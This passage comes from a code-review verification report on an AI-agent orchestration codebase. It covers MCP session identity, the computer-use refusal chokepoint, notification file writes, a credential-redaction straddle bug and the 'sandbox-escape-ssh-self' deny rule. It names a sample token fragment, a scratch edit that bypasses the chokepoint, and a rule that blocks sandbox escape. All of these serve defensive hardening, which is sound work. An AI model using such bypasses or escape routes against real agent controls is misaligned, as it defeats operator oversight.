  - src/kiro_crew/peer_resolve.py:209-218 — walk yields '' for a pid hosting SEVERAL sessions
  - src/kiro_crew/mcp_gateway/daemon/control.py:167-173 — 'A tokenless connection ... stays on the PID-wide behavior ... A claim carrying no token retargets every connection under the PID'
  - src/kiro_crew/mcp_gateway/claim.py:118-121 — empty token 'keeps the PID-wide behavior'
  - src/kiro_crew/acp/session_provider.py:915-920 — rekey claim falls back to PID-wide when the handle has no stub token
- **Checked by:** read
- **Required outcome:** On a runtime hosting more than one session, no MCP connection is governed or audited under another session's identity. A connection that cannot name its session fails closed for state-mutating and authorization uses rather than inheriting the runtime's latest claim.
- **Solution:**
  1. Check upstream PR #17524 'stop answering MCP identity per process' (state unverified). The token machinery above looks like its landing, so confirm what remains open.
  2. In mcp_gateway/daemon/control.py (around 160-200), when a claim targets a pid whose tenancy record shows more than one session, do not re-target TOKENLESS connections. Leave them identity-less and audit it, mirroring the identity.py fail-closed branch.
  3. Keep the PID-wide behaviour only for single-session runtimes (positive evidence via peer_resolve tenancy `shared`).
  4. Update session.md and runtime-ownership.md in the same commit.
- **Done when:** A gatewayd unit test registers two token-carrying stubs and one tokenless stub under one runtime pid with two claimed sessions A and B. A tokenless claim for B leaves the tokenless stub with no caller (SEL denial recorded) and does not change A's stub. The same test with a single-session pid keeps today's PID-wide re-target.
- **Upstream:** #17523 #17545 PR #17524 (state unverified)
- **Changed from the source claim:** CONFIRMED (machinery) / NOT VALIDATED -> PARTLY: the strict resolver and gatewayd now answer per session via signed per-session tokens and refuse multi-session pids. The per-process path that remains is tokenless connections receiving PID-wide claims. Severity assigned 20 (legacy/edge topology).
- **Second reader:** security-rules check: agreed.
- **Sources:** verification_needed:Part3(#17523/#17545), verify_needed:G8(#17523/#17545), verify_needed:G37

### SEC-21 [20, default, effort S] No structural pin that every tool-dispatch route funnels through tools._dispatch — CONFIRMED
- **Verified claim:** Absence confirmed, scope corrected. The in-band chokepoint AGENTS.md names is computer_use/tools.py `_dispatch`, entered through `dispatch_tool`. It enforces computer use's own refusals (keystone enable, KiroCrew-self policy, click_method), not governance; computer use is deliberately ungoverned. A structural AST pin exists only for ONE caller module: test_computer_use_cli.py asserts the CLI executes through tools.dispatch_tool and calls no service method beyond status/probe_permissions. There is no repo-wide pin that every module executing a computer-use action goes through dispatch_tool. Today no route bypasses it: the only action callers are dashboard/handlers/computer_use.py:953 (the MCP shim's gateway handler) and computer_use/cli.py (pinned). Other importers (agent.py, hooks.py, mcp_computer.py, dashboard/handlers/core.py, file_delivery_consent.py, validation.py) import only enable_state, types or a backend capability probe.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/computer_use/tools.py:384-406 _dispatch 'The ordered chokepoint'; :288-327 dispatch_tool -> _dispatch
  - src/kiro_crew/dashboard/handlers/computer_use.py:889, :953 — `from kiro_crew.computer_use.tools import dispatch_tool`; `return dispatch_tool(...)`
  - src/kiro_crew/computer_use/cli.py:250 — service used for status/probe only; :304, :346 dispatch_tool
  - test/test_computer_use_cli.py:322-357 TestCallIsNotABypass — AST pin scoped to `cu_cli` only
  - grep: get_shared_service() called only in computer_use/tools.py:406 and computer_use/cli.py:250; no other module imports computer_use.service
  - AGENTS.md 'Computer use is deliberately NOT governed ... refusals run in band on tools._dispatch, never at the fail-OPEN hooks gate'
- **Checked by:** read
- **Required outcome:** A test fails if any module outside computer_use/tools.py (and the CLI's two allowed probes) reaches the computer-use service or a platform driver's action surface directly. A new action route then cannot ship without passing the in-band chokepoint. The pin is a structural union over src/, the shape test_sandbox_governance_mask.py uses, not a regex over call text.
- **Solution:**
  1. Add a repo-wide AST test (next to test_computer_use_cli.py's TestCallIsNotABypass) that walks every module under src/kiro_crew. Fail on any import of kiro_crew.computer_use.service, or of the *_driver / *_ffi / backend action APIs, outside an allowlist {computer_use/*, the CLI's status/probe use}, and on any call to get_shared_service() outside computer_use/tools.py and computer_use/cli.py.
  2. Pin that every dashboard/MCP route registering a computer-use tool calls dispatch_tool.
  3. Document the pin in computer-use.md in the same commit.
- **Done when:** The new test passes at HEAD. A scratch edit adding `from kiro_crew.computer_use.service import get_shared_service; get_shared_service().click(...)` to any dashboard handler makes it fail, naming the file.
- **Changed from the source claim:** Confirmed as absence: the only structural pin is CLI-scoped. Corrected: the chokepoint enforces computer-use refusals, not governance. No current bypass found. Severity 30 -> 20 (preventive).
- **Second reader:** security-rules check: agreed.
- **Sources:** verify_needed:A11

### REL-3 [18, default, effort S] Notifications history rewritten non-atomically — CONFIRMED

> **COMPLETED** — verified fixed on `main` by code read (no tests run): aab0b1eb0 (dashboard/state.py): both notifications rewrite and trim now use atomic_write  
- **Verified claim:** _rewrite_notifications and _maybe_trim_notifications both overwrite notifications.jsonl in place with Path.write_text, which truncates and then writes. A kill, crash or ENOSPC partway through leaves a truncated or empty history file. The repo's atomic_write helper (temp file + os.replace, with a `newline` parameter) exists and is not used here. Impact is bounded: the module documents the history as best-effort ('history is a cache, delivery is the broadcast'), and all notification I/O is serialised on one single-worker executor, so the exposure is crash/disk-full, not concurrency.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/dashboard/state.py:10699-10707 _rewrite_notifications — `path.write_text("".join(lines), encoding="utf-8")`
  - src/kiro_crew/dashboard/state.py:10762 _maybe_trim_notifications — `path.write_text("".join(lines[index] for index in kept), encoding="utf-8", newline="")`
  - src/kiro_crew/atomic_write.py:997-1008 — `def atomic_write(path, content, *, fsync=False, mode=None, newline=None, ...)` (temp file + rename)
  - src/kiro_crew/dashboard/state.py:10680-10683 — 'Failures are swallowed (legacy system producers are explicitly best-effort — history is a cache, delivery is the broadcast)'
  - src/kiro_crew/dashboard/state.py:10666-10676 — single-worker `notif-io` executor serialises append vs rewrite
- **Checked by:** read
- **Required outcome:** A crash, kill or full disk during a notifications rewrite or trim leaves either the old file or the complete new file, never a truncated one. Trim keeps its byte-exact line preservation (newline='').
- **Solution:**
  1. In dashboard/state.py:10705 replace path.write_text with `atomic_write(path, "".join(lines), fsync=True)`.
  2. At :10762 use `atomic_write(path, ..., newline="", fsync=True)` so CRLF/bare-CR rows keep their bytes.
  3. Make sure the rename still happens on the notif-io executor thread, so an append cannot land between the read and the replace (the executor already serialises them).
  4. Check the file mode is preserved: atomic_write applies umask permissions on a new inode, as `open(path, 'a')` does today. Pass `preserve_access_control_from` only if the file is ever given a tighter mode.
- **Done when:** A unit test monkeypatches os.replace (or the temp-file write inside atomic_write) to raise midway during _rewrite_notifications and _maybe_trim_notifications, then asserts the original notifications file is byte-identical afterwards. A second test asserts that a trim of a file containing a CRLF row preserves that row's bytes.
- **Changed from the source claim:** Severity 30 -> 18: the history is documented as a best-effort cache, and the write window is small (the trim runs only past 2x the cap). HEAD lines 10705 and 10762 match the source.
- **Sources:** FIX_PLAN:REL-3, REVIEW_FINDINGS:Part1#8

### REL-43 [15, default, effort L] build_message: 36 params, 932-line body; rules-gate chokepoint is a tested function — PARTLY
- **Original claim:** build_message has ~45 parameters (corrected below)
- **Verified claim:** context.py:3004 build_message takes 36 parameters plus self (21 positional incl. self, 16 keyword-only), not ~45, and its body is 932 lines spanning fresh / warm / warm-reinjection / slim-resume x member/crew x provider-type branches, with a `user_span_out` out-parameter. The fail-closed rules-gate invariant is not protected only by a comment: the decision is centralised in a real function (kiro_crew.members.member_turn_context) that every delivery branch consults, and it has dedicated tests (test/test_member_turn_context.py, test/test_context_composition_contract.py). What remains convention is that a NEW lifecycle branch added to build_message must call that chokepoint. The TurnContext refactor is a design decision.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/context.py:3004 build_message — ast count: 37 args incl. self (pos=21, kwonly=16), body 932 lines; names include user_span_out, needs_reinjection, minimal_context, provider_type, member, execution_context
  - src/kiro_crew/context.py:3116-3135 — 'The INVARIANT: every member turn passes the fail-closed rules gate ... The decision lives in ONE chokepoint — kiro_crew.members.member_turn_context — which every delivery branch below consults'; :3191 `if _member_turn.enforce_rules_gate:`
  - test/test_member_turn_context.py and test/test_context_composition_contract.py exist and reference member_turn_context
- **Checked by:** ran-new-script
- **Required outcome:** A maintainer decision on collapsing build_message's argument list into a typed TurnContext (and per-lifecycle strategies); if approved, the rules-gate invariant becomes structural (no branch can deliver a member turn without the gate) rather than resting on each branch calling the chokepoint.
- **Solution:**
  1. Record the decision in docs/decisions/.
  2. If approved: introduce a frozen TurnContext dataclass carrying the 36 inputs, keep build_message(**legacy) as a thin adapter for one release, and move the lifecycle branches into strategy objects whose base class calls members.member_turn_context unconditionally.
  3. Replace user_span_out with a returned value.
  4. Update docs/architecture/context-management.md in the same commit.
- **Done when:** A test constructs each lifecycle strategy for a member turn whose rules file is unreadable and asserts every one raises the fail-closed refusal; an ast ratchet pins build_message's parameter count at or below the agreed number.
- **Changed from the source claim:** Parameter count is 36 (+self), not ~45; the chokepoint is a real function with tests, so 'only a documented convention' is overstated.
- **Sources:** verification_needed:P1-4, verification_needed:refactor(build_message)

### REL-50 [15, default, effort S] session/new gate is host-sized ('auto'); outer cold-start _start_sem is still fixed at 4+1 — PARTLY

> **COMPLETED** — verified fixed on `main` by code read (no tests run): 285d85b31 (session_allocation.py:209-226 `new_cold_start_semaphore`): outer cold-start width now `max(MAX_CONCURRENT_COLD_STARTS, effective_session_start_concurrency("auto"))` + foreground reserve, so it follows the host   MAX_CONCURRENT_COLD_STARTS=4 remains …
- **Original claim:** Cold-start queues not sized from the host (corrected below)
- **Verified claim:** Half sized from the host at HEAD. The SessionStartGate that bounds outstanding ACP session/new requests is host-sized when agent.session_start_concurrency is 'auto' (the default): session_start_sizing reads the usable cores (affinity + cgroup cpu.max) and available memory once at boot and uses roughly min(cpus // 4, available_GB // 3) clamped to [2, 16]. The outer cold-start queue — SessionManager's _start_sem, which every new session's provider.start() holds — is still a fixed constant: MAX_CONCURRENT_COLD_STARTS = 4 background permits plus FOREGROUND_COLD_START_RESERVE = 1, independent of the host. Tracker state of #17075 / PR #17123 not checkable.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/session_start_sizing.py:1-24 module doc — 'Host sizing for the start limits ... roughly cpus // 4 and available_GB // 3, whichever is smaller, clamped to [2, 16]'; :224 resolve_session_start_sizing
  - src/kiro_crew/config/sections.py:1411-1412 — session_start_concurrency default='auto'
  - src/kiro_crew/session_allocation.py:194 `MAX_CONCURRENT_COLD_STARTS = 4`; :203 `FOREGROUND_COLD_START_RESERVE = 1`; :206-211 new_cold_start_semaphore -> PrioritySemaphore(4 + 1, foreground_reserve=1); :223 SessionRegistryState.start_sem default_factory
- **Checked by:** read
- **Required outcome:** Both cold-start limits derive from the same host reading (or the outer one is provably never the binding constraint), so a large host is not throttled to 4 concurrent background starts and a small host is not over-admitted.
- **Solution:**
  1. Size MAX_CONCURRENT_COLD_STARTS from session_start_sizing.host_capacity() (e.g. the same width as the SessionStartGate, floor 4 to keep today's behaviour as the minimum), computed once at SessionManager construction (session_allocation.py:206).
  2. Keep FOREGROUND_COLD_START_RESERVE additive.
  3. Remember the identity sweep drains this semaphore as its barrier (session_lifecycle.retire_kiro_identity_sessions) — drain must still collect every permit.
  4. Document in docs/system-specs/modules/session.md.
- **Done when:** Unit test: with host_capacity monkeypatched to 64 cpus / 256 GB, new_cold_start_semaphore() reports capacity == sized width + 1; with 2 cpus / 4 GB it reports the floor (4 + 1); PrioritySemaphore.drain still acquires all permits.
- **Upstream:** #17075 PR #17123 (state unverified)
- **Changed from the source claim:** The session/new gate is already host-sized ('auto'); only the outer _start_sem cold-start queue is fixed.
- **Sources:** verify_needed:G37(#17075)

### SEC-14 [15, default, effort S] Cap-straddle token leak is in api_file_read (cuts, then redacts); office_preview is fixed — PARTLY

> **COMPLETED** — covered by open upstream PR #17298 ("redact file-read content before cutting it to the cap"; diff verified: over-read by `_STREAM_HOLDBACK_JWT_MAX`, redact-then-agree, then cut); not duplicated.
- **Original claim:** office_preview cap-straddle serves part of a credential unmasked (corrected below)
- **Verified claim:** Mis-scoped. At HEAD the office preview does NOT have the cap-straddle. The module redacts before capping ('redacted before they are capped'). doc_parser stops only after the whole paragraph or slide that reaches max_chars, and doc_blocks' budget is whole-or-nothing. A real .docx with a ghp_ token paragraph straddling _OFFICE_PREVIEW_CAP served '[REDACTED: cr...' and no fragment. The straddle IS present in the other endpoint. api_file_read reads read_cap+1 bytes, does `content = content[:read_cap]` FIRST, and then redacts. A ghp_ token cut at the cap serves its first 20 characters unmasked ('ghp_A1b2C3d4E5f6G7h8I9j'), while a key=value anchored secret is still redacted because its anchor survives the cut. The claim's premise that #17298 fixed api_file_read does not hold in this checkout. #17298 may be unmerged; this checkout is a 1-commit shallow clone, so history cannot be checked.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/dashboard/file_api/office_preview.py:1 — module docstring 'redacted before they are capped'; :321-327 `text = redact(text)` then `text = text[:_OFFICE_PREVIEW_CAP]`; :108-131 _cap_slides redacts each slide before cutting
  - src/kiro_crew/doc_parser.py:298-311 — docx extraction appends whole paragraphs and stops after the one reaching max_chars; pptx slides likewise (:407-423)
  - src/kiro_crew/doc_blocks.py:96-110 _Budget.spend — 'WHOLE OR NOTHING, never a prefix'
  - src/kiro_crew/dashboard/handlers/files.py:2085-2088 — `outcome = await _run_path_probe(` ... `read_cap + 1,`; :2146-2147 `truncated = len(content) > read_cap`; `content = content[:read_cap]`; :2156-2159 redact AFTER the cut
  - ran (real .docx through extract_text + handler order): 'any token fragment served: False'
  - ran (api_file_read order): served tail '\nghp_A1b2C3d4E5f6G7h8I9j' -> fragment leaked; aws key=value cut -> '[REDACTED: credential]'
  - git log: shallow clone with 1 commit; no local record of #17298
- **Checked by:** ran-new-script (+ sec14_straddle.py)
- **Required outcome:** No dashboard file endpoint serves a fragment of a credential because a size cap cut it before redaction. Each capped read either redacts a span that fully contains any value crossing the cap and then cuts, or drops the trailing partial unit. office_preview already meets this; api_file_read must too.
- **Solution:**
  1. In dashboard/handlers/files.py api_file_read (2036+), read past the cap by a margin at least the longest redactable token (the stream redactor's 4096 JWT ceiling is a safe bound), redact the whole read, and only then cut to read_cap, computing `truncated` from the raw length as office_preview does (office_preview.py:326-329).
  2. Apply the same order to the owner-view branch (redact_owner_view_via_context).
  3. Check whether upstream #17298 (state unverified) already implements this before writing it.
  4. No change to office_preview.
- **Done when:** Unit test: a file whose ghp_ token begins 20 chars before _FILE_READ_CAP, read through api_file_read with an aiohttp test client in a tmp home. It asserts the response body contains no 'ghp_' fragment, X-Truncated is 'true' and X-Redacted is 'true'. The existing office_preview straddle behaviour is pinned with the .docx fixture used here.
- **Upstream:** #17325 #17298 (state unverified)
- **Changed from the source claim:** CONFIRMED (no line) -> PARTLY: the office_preview half is already fixed at HEAD (redact-then-cap over whole extraction units). The live straddle is in api_file_read (cut-then-redact), the endpoint the source said was fixed. Severity assigned 15 (owner-gated endpoint; a partial token fragment leaks, anchored key=value secrets do not).
- **Second reader:** security-rules check: agreed.
- **Sources:** verification_needed:Part3(#17325)

### REL-36 [15, armed, effort S] mcp-gateway SpawnGate waiters not priority-ordered — CONFIRMED

> **COMPLETED** — verified fixed on `main` by code read (no tests run): 28265ce36 + 1e0bb17e7: mcp_gateway/admission.py SpawnGate has interactive and background waiter queues (:306-321); interactive granted ahead, FIFO within class, background aging  
- **Verified claim:** mcp-gateway's SpawnGate admits backend spawns in strict FIFO order from a single deque with no priority classes, so an interactive session's server start waits behind any earlier queued spawn (prewarm, background or bulk session fan-out) once the 4 in-flight slots (default capacity, floor 1, ceiling 8) are taken. Scope: armed (only when the broker runs).
- **Evidence (at `397f4be`):**
  - src/kiro_crew/mcp_gateway/admission.py:204-205 `class SpawnGate: """FIFO admission with a movable fixed capacity. Single event loop."""`; `self._waiters: deque[_Waiter] = deque()`
  - src/kiro_crew/mcp_gateway/admission.py:277-297 acquire(*, label, deadline, on_queued, keepalive_secs) — 'Wait for a slot in FIFO order'; no priority parameter
  - src/kiro_crew/mcp_gateway/admission.py:12-14 module doc — 'Callers past the count wait in FIFO order'
  - src/kiro_crew/mcp_gateway/admission.py:56-58 DEFAULT_CAPACITY = 4
- **Checked by:** read
- **Required outcome:** Spawns for a person-initiated session are admitted ahead of queued background/prewarm spawns, without starving the latter (bounded aging).
- **Solution:**
  1. Add a `priority` argument to SpawnGate.acquire (admission.py:277) with two classes (interactive, background) mirroring session_lifecycle's PrioritySemaphore, keep FIFO within a class, and age a background waiter to interactive after a bound.
  2. Pass priority from gatewayd's attach path based on the caller's session kind (prewarm and pooled refills = background).
  3. Document in docs/architecture/mcp.md.
- **Done when:** Unit test with an injected clock: capacity 1, one permit held, enqueue background B then interactive I; release the permit and assert I is granted before B; with aging, assert B is granted after the aging bound even under a stream of interactive arrivals.
- **Upstream:** #15830 (state unverified)
- **Sources:** verify_needed:G25(#15830)

### REL-8 [15, armed, effort S] Research lab page falls back to polling forever after one SSE error — CONFIRMED

> **COMPLETED** — verified fixed on `main` by code read (no tests run): 344389b2f: apps/auto-research/ResearchLabPage.tsx (:615-636) retries the EventSource with backoff and stops polling on reconnect  
- **Verified claim:** CampaignDetail sets sseFailed=true and closes the EventSource on the first SSE error. The campaign query then refetches every 5 s for as long as that campaign stays open, because sseFailed resets only when `id` changes. The stream is never retried and nothing tells the user. The backend stream does not end on its own (a `while True` loop with a 15 s keepalive timeout), so only a real drop triggers this. Updates keep arriving through polling, so the cost is latency and requests, not data.
- **Evidence (at `397f4be`):**
  - website/src/apps/auto-research/ResearchLabPage.tsx:605 — `const [sseFailed, setSseFailed] = useState(false)`
  - website/src/apps/auto-research/ResearchLabPage.tsx:612 — `refetchInterval: sseFailed ? 5000 : false`
  - website/src/apps/auto-research/ResearchLabPage.tsx:617-624 — `setSseFailed(false)` only in the [id, qc] effect; `es.onerror = () => { setSseFailed(true); es.close() }`
  - src/kiro_crew/apps/builtins/auto_research/handlers.py:918-950 _handle_stream — `while True:` with `asyncio.wait_for(q.get(), timeout=15.0)`
- **Checked by:** read
- **Required outcome:** After an SSE error the page keeps polling, retries the stream with capped backoff, and stops polling once the stream reconnects. While polling, a small i18n'd 'live updates paused' indicator is shown.
- **Solution:**
  1. In ResearchLabPage.tsx:615-624, replace the one-shot close with a reconnect loop: on error close, set sseFailed=true, and schedule a new EventSource after a capped backoff. On onopen set sseFailed=false and reset the backoff.
  2. Clear the timer and stream in cleanup.
  3. Render an indicator while sseFailed using a new catalog key under apps.autoResearch.researchLabPage (i18n-catalog.md, all 12 locales per the i18n gates). Use design tokens and no text-xs.
  4. Keep React Query as the data path.
- **Done when:** Vitest with an EventSource double and fake timers (restored in afterEach). After onerror the query refetches at 5 s and the indicator text (by catalog key) is visible. After the backoff a new EventSource is constructed, and after its onopen the indicator disappears and no further 5 s refetch fires.
- **Changed from the source claim:** Severity 20 -> 15 (polling still delivers updates; armed: the auto-research app must be in use). HEAD line 622 unchanged.
- **Sources:** FIX_PLAN:REL-8, REVIEW_FINDINGS:Part1#12

### SEC-17 [15, armed, effort M] sandbox-escape-ssh-self: denies are permanent; own-address set only grows until restart — PARTLY

> **COMPLETED** — fixed on `main` in `9c892db` (`fix/ssh-self-own-set-generation`): each refresh pass rebuilds the live own set (seed + netlink + DNS) with a short-grace departed ledger so the set shrinks again; own-address DENY verdicts are generation-tagged and revalidated once when the generation moves (served stale while a single worker re-resolves); loopback/unspecified denies stay permanent. security.md updated in-commit.
- **Original claim:** sandbox-escape-ssh-self stale decision cache (corrected below)
- **Verified claim:** A lifetime-sticky refusal mechanism exists in the sandbox-escape-ssh-self rule's host classifier, so a remote host allowed early can be refused for the rest of a long-running gateway's life. (a) DENY verdicts in _HOST_VERDICT_CACHE are permanent by design ('DENY verdicts stay permanent: over-blocking is this floor's safe direction'); only ALLOW verdicts expire (_HOST_VERDICT_ALLOW_TTL = 300 s). (b) The own-host name/address set is only ever UNIONED, at startup, on netlink publication and on each 300 s refresh, and never shrinks. Once the gateway host has held an address (an old DHCP lease, a VPN or container interface) or resolved a name to one, any remote host that later resolves to that address is classified 'self' and denied until restart. After the 300 s ALLOW TTL lapses, the revalidation that hits such an address flips the host to a permanent deny. That matches 'allowed, then refused 4x on a 41 h gateway', but the reporter's actual trigger depends on that host's DNS and interface history and cannot be reproduced here.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/security/denied_rules.py:1461-1480 — rule `sandbox-escape-ssh-self`; security/__init__.py:1399 structural check `_argv._is_ssh_to_self`
  - src/kiro_crew/security/argv_floor.py:1355-1361 — 'an ALLOW verdict is not reused unbounded ... DENY verdicts stay permanent'; `_HOST_VERDICT_ALLOW_TTL = 300.0`
  - src/kiro_crew/security/argv_floor.py:1400 — `_HOST_VERDICT_CACHE[host] = verdict` (cap 4096, oldest evicted)
  - src/kiro_crew/security/argv_floor.py:2088-2101 _publish_netlink_addresses — `_OWN_HOST_NAMES_CACHE = base | frozenset(...)`; :2205-2209 'Merges into the existing cache (a later partial pass never SHRINKS it)'; :1957 `_OWN_HOST_REFRESH_SECS = 300.0`
- **Checked by:** read
- **Required outcome:** The self-host classification reflects the host's CURRENT addresses. An address the host no longer holds stops marking remote hosts as self. A deny that came from a since-departed address is re-evaluated rather than permanent, while still never admitting a name that currently resolves to loopback or an own address (fail-closed direction kept).
- **Solution:**
  1. In security/argv_floor.py, rebuild the own-address set from the current interface snapshot on each refresh, keeping a short grace window for departed addresses, instead of unioning forever (2088-2101, 2190-2215).
  2. Tag each DENY verdict with the own-set generation it was computed under. When the generation changes, revalidate the deny through the existing single-flight worker instead of serving it permanently. A deny for loopback or unspecified addresses stays permanent.
  3. Add the stale-cache behaviour to security.md's denied-command section for this rule.
  4. Not a widening: a host that resolves to a current own address is still denied.
- **Done when:** Unit test with injected resolver and interface seams (no network, frozen monotonic clock): own set {10.0.0.5}. remote.example resolves to 10.0.0.5 -> denied. The interface drops 10.0.0.5 and the clock advances past the refresh -> remote.example is permitted on the next check. remote.example resolving to 127.0.0.1 stays denied throughout.
- **Upstream:** #17035 (state unverified)
- **Changed from the source claim:** No code pointer in the source. The mechanism was found: permanent DENY verdicts plus a never-shrinking own-address set. Verdict PARTLY because the reporter's specific trigger needs a live host. Severity assigned 15 (fails in the safe direction; usability).
- **Second reader:** security-rules check: agreed.
- **Sources:** verification_needed:Part3(#17035)

### REL-4 [12, default, effort S] Notification trim failures swallowed silently — CONFIRMED

> **COMPLETED** — verified fixed on `main` by code read (no tests run): aab0b1eb0: `_notifications_persist_failure` logs trim and rewrite failures at WARNING, rate-limited (state.py)   Replaces the silent `except: pass`
- **Verified claim:** _maybe_trim_notifications ends in `except Exception: pass`, with no logging at any level. If a trim fails persistently (unreadable line handling, a permission change, a full disk), the file keeps growing and nothing records why. The sibling _rewrite_notifications only logs at DEBUG. The trim also re-reads the whole file on every append before checking the size, so growth makes every append slower.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/dashboard/state.py:10763-10764 — `except Exception:\n pass`
  - src/kiro_crew/dashboard/state.py:10706-10707 — sibling `logger.debug("Failed to rewrite notifications file", exc_info=True)`
  - src/kiro_crew/dashboard/state.py:10742-10743 — `lines = _read_notification_lines(path)` before `if len(lines) <= _MAX_PERSISTED_NOTIFICATIONS * 2: return`
  - src/kiro_crew/dashboard/state.py:10692 — trim is called after every append in _persist_notification
- **Checked by:** read
- **Required outcome:** A failing trim is recorded where an operator would see it, rate-limited so a persistent failure does not flood the log on every append.
- **Solution:**
  1. In dashboard/state.py:10764 replace `pass` with a WARNING log including exc_info, rate-limited: log the first failure and then at most once per N minutes, using an injectable clock for testability.
  2. Optionally raise the sibling _rewrite_notifications log (10707) from debug to warning under the same limiter.
  3. No behaviour change otherwise.
- **Done when:** A unit test makes _read_notification_lines raise, calls _maybe_trim_notifications twice, and asserts exactly one WARNING record (caplog) with the exception attached, using a frozen clock.
- **Changed from the source claim:** Severity 20 -> 12 (log-only defect on a best-effort cache). The source said the sibling 'already logs'; it logs at DEBUG only. HEAD lines 10763-10764 (match the source).
- **Sources:** FIX_PLAN:REL-4, REVIEW_FINDINGS:Part1#11

### REL-6 [10, default, effort S] AppIcon leaves SVGs with an XML prolog or leading comment blank; no shipped icon has one — PARTLY

> **COMPLETED** — verified fixed on `main` by code read (no tests run): 3b8b09639: components/AppIcon.tsx falls back to the placeholder path when a 2xx body is not an SVG (prolog or comment)   Latent case only, as the finding says
- **Original claim:** SVG icons with XML prolog or leading comment never render (corrected below)
- **Verified claim:** The mechanism is as claimed. AppIcon's fetch handler stores markup only when `text.trim().startsWith('<svg')`. Any other 2xx body (an `<?xml` prolog, a leading `<!--` comment, a BOM-free HTML page) sets neither markup nor imgFailed, so the component renders the empty placeholder span forever. Overstated as a live defect: this path is reached only by first-party bundled icons matching `^/app-assets/<a>/<b>.svg$`, and none of the 109 SVGs shipped under src/kiro_crew and website/public starts with anything but `<svg`. It is a latent robustness gap that turns a future prolog-carrying asset into a silent blank icon instead of the fallback.
- **Evidence (at `397f4be`):**
  - website/src/components/AppIcon.tsx:187-190 — `if (text.trim().startsWith('<svg')) { svgCache.set(url, text); if (!cancelled) setMarkup(text) }` (no else)
  - website/src/components/AppIcon.tsx:192 — imgFailed set only on fetch rejection / non-ok
  - website/src/components/AppIcon.tsx:231-232 — while markup is null: `return <span className="inline-flex shrink-0" .../>` (empty placeholder)
  - website/src/components/AppIcon.tsx:51-54 — APP_ASSET_ICON_RE = /^\/app-assets\/[a-zA-Z0-9_-]+\/[a-zA-Z0-9_-]+\.svg$/
  - scan: 109 .svg files under src/kiro_crew and website/public, 0 start with anything other than `<svg` (after BOM/whitespace strip)
- **Checked by:** read
- **Required outcome:** Every fetch of an app-asset SVG reaches a terminal state: either sanitized inline markup or imgFailed=true (which leads to the fallback URL, then the glyph). A prolog or leading comment does not by itself make an icon blank.
- **Solution:**
  1. In website/src/components/AppIcon.tsx:186-191, strip a BOM, find the first `<svg` followed by whitespace or `>` (case-insensitive), and slice from there.
  2. If none is found, `setImgFailed(true)` (guarded by `!cancelled`).
  3. DOMPurify sanitisation at 162-168 already runs on whatever is stored, so keep storing the sliced text and let scopedMarkup sanitise it.
  4. No user-facing strings change.
- **Done when:** Vitest with MSW: an app-asset URL that returns `<?xml version="1.0"?><svg ...>` renders the inline svg. One that returns `<!-- c --><svg ...>` renders it too. One that returns `<html>` renders the fallback `<img>` (or the glyph when no fallback is given). Assertions wait on findBy*, with no sleeps.
- **Changed from the source claim:** confirmed -> PARTLY: the mechanism is real, but no shipped asset triggers it and only first-party /app-assets icons take this path. Severity 35 -> 10. HEAD line 187 unchanged.
- **Sources:** FIX_PLAN:REL-6, REVIEW_FINDINGS:Part1#6
